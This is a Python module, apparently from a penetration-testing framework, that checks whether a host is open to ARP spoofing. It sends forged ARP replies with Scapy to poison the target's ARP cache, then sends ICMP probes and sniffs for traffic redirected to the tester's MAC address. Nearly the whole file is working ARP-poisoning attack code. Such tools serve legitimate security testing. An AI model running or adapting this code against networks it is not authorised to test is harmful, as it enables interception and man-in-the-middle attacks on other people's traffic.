from jframework.modules.model import Module
import jframework.extras.writeformat as wf
from jframework.extras.check_scapy import check
from jframework.extras.root import get_root
import threading
from time import sleep
import logging
# Disable warning IPv6
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
try:
    from scapy.all import *
    conf.verb = 0
except:
    pass

class Arp(Module):

    def __new__(cls, *args, **kwargs):
        if os.getuid() != 0:
            # getRoot
            use = get_root("spoofing/arp")
            if use >= 0:
                print("Now you don't have root permissions")
                return -1 # Can't load again

        return super(Arp, cls).__new__(cls)

    def __init__(self):
        super(Arp, self).__init__()
        self.mac_address = ""
        self.interface = ""
        self.ip2_address = ""
        self.success = False
        self.seconds = 8

    def get_options(self):
        options = super(Arp, self).get_options()
        options.append("mac")
        options.append("iface")
        return options

    def conf(self):
        super(Arp, self).conf()
        wf.printf("mac", self.mac_address, "Your MAC address")
        wf.printf("iface", self.interface, "Network interface")

    def ip(self, address):
        super(Arp, self).ip(address)
        # The spoofed IP in the target doesn' matter
        aux_ip = self.host.split(".")
        last_byte = aux_ip[3]
        if(int(last_byte) >= 254):
            last_byte = "253"
        else:
            last_byte = str(int(last_byte) + 1)
        self.ip2_address = aux_ip[0] + "." + aux_ip[1] + "." + aux_ip[2] + "." + last_byte

    def mac(self, m):
        self.mac_address = m

    def iface(self, i):
        self.interface = i

    def attack(self):
        p = ARP(op=2, pdst=self.host, psrc=self.ip2_address)
        print("Poisoning")
        count = 1
        while count < 10 and not self.success:
            send(p, verbose=False)
            count += 1
            sleep(0.75)

    def sniff_auxiliar(self, pkt):
        if (not self.success):
            if (pkt.haslayer(IP) and str(pkt.getlayer(IP).dst) == self.ip2_address
                and str(pkt.getlayer(IP).src) == self.host):
                if pkt.haslayer(Ether):
                    if str(pkt.getlayer(Ether).dst) == self.mac_address:
                        self.success = True

    def run_sniff(self):
        sniff(prn=self.sniff_auxiliar, filter="host " + 
                str(self.host), iface=self.interface, timeout=self.seconds)

    def run(self):
        resp = check()
        if (resp != "ok"):
            print(resp)
            return
        print("Wait " +str(self.seconds) + " seconds")
        try:
            t1 = threading.Thread(target=self.attack)
            t2 = threading.Thread(target=self.run_sniff)
            t1.start()
            t2.start()

            p1 = IP(src=self.ip2_address, dst=self.host) / ICMP()
            indice = 0
            print("Sending packets to check")
            while indice < 16 and not self.success:
                send(p1, verbose=False)
                sleep(0.15)
                indice += 1

            t1.join()
            t2.join()

            if self.success:
                print("Success -> " + self.host + " is vulnerable")
            else:
                print("Fail -> " + self.host + " isn't vulnerable")

        except Exception as e:
            print("Something was wrong")
            print(e)
